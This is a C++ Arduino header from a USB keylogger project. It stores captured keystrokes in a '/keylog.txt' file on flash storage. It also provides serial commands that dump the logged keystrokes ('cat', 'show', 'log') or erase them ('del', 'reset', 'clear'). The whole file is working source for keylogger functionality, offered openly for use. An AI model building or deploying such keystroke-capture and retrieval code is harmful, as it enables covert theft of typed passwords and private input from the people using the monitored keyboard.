// Result propagation via flash storage for USB keylogger
// See https://github.com/gereonsuch/keylogger for more information
// Copyright (C) 2026 Gereon Such

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

#ifndef EMBD_ENV_FLASH_OUTPUT_HANDLER_HPP
#define EMBD_ENV_FLASH_OUTPUT_HANDLER_HPP

#pragma once

#include <Arduino.h>
#include <LittleFS.h>

template <uint32_t min_flush_interval = 3000u, uint32_t min_reopen_interval = 5000u, unsigned recv_buf_len = 32> // default flush every 3 secs
class FlashOutputHandler {

    bool _initialized {false};
    File _fh;
    uint32_t _last_flush {0};
    uint32_t _last_open_call {0};

    // buffer serial characters to retreive the log
    char _recv_buffer[recv_buf_len];
    unsigned _pos = 0;

    template <char mode = 'a'>
    bool openFile(const char* filename = "/keylog.txt") {
        _last_open_call = millis();
        if(_fh) _fh.close();
        char _mode_str[2];
        _mode_str[0] = mode;
        _mode_str[1] = '\0';
        _fh = LittleFS.open(filename, _mode_str);
        if(! _fh) return false;
        return true;
    }

public:
    bool init() {
        if(_initialized) return true;
        if(!LittleFS.begin()) return false;
        _initialized = true; // if littleFS failed, some basic configuration failed
        return openFile();
    }

    bool writeContent(const char* content, unsigned len) {
        if(! _initialized) return false; // not correctly initialized, LittleFS failed

        uint32_t now = millis();

        if(! _fh) {
            if(now - _last_open_call > min_reopen_interval) {
                if(! openFile()) return false;
                if(! _fh) return false; // still not open
            } else return false; // wait some time to try to reopen again
        }

        // if here, _fh should be writtable
        if(content != nullptr && len > 0u) {
            _fh.write(content, len);
            if(_last_flush == 0u || now - _last_flush > min_flush_interval) {
                flush();
                _last_flush = now;
            }
        }
        return true;
    }

    void flush() {
        if(! _initialized) return;
        if(! _fh) return;
        _fh.flush();
        _last_flush = millis();
    }

public: // the flash fs is not available directly, thus we need to propagate it via serial if connected... sigh....

    bool checkPropagate() {
        while (Serial.available()) {
            char c = Serial.read();
            if(c == '\n') {
                _recv_buffer[_pos] = '\0';
                _pos = 0;
                return evalCommand();
            }
            _recv_buffer[_pos] = c;
            _pos++;
            if(_pos >= recv_buf_len) { // buffer full without newline, reset. 
                _pos = 0;
                return false;
            }
        }
        return false;
    }

protected:
    template <unsigned bufsize = 256>
    bool evalCommand() {
        if(strncmp(_recv_buffer, "cat", 3) == 0 || strncmp(_recv_buffer, "show", 4) == 0 || strncmp(_recv_buffer, "log", 3) == 0) {
            bool ok = openFile<'r'>();
            if(ok) {
                if (_fh) {
                    uint8_t buf[bufsize];
                    while (_fh.available()) {
                        const int n = _fh.read(buf, sizeof(buf));
                        if (n <= 0 || n > bufsize) break;
                        Serial.write(buf, n);
                    }
                    _fh.close(); 
                } else ok = false;
            }

            openFile(); // default
            return ok;
        }

        if(strncmp(_recv_buffer, "del", 3) == 0 || strncmp(_recv_buffer, "reset", 5) == 0 || strncmp(_recv_buffer, "clear", 5) == 0) {
            bool ok = openFile<'w'>(); // reopen with "w" resets teh content
            openFile(); // reopen with default
            return ok;
        }

        return false;
    }
    
};

#endif // EMBD_ENV_FLASH_OUTPUT_HANDLER_HPP
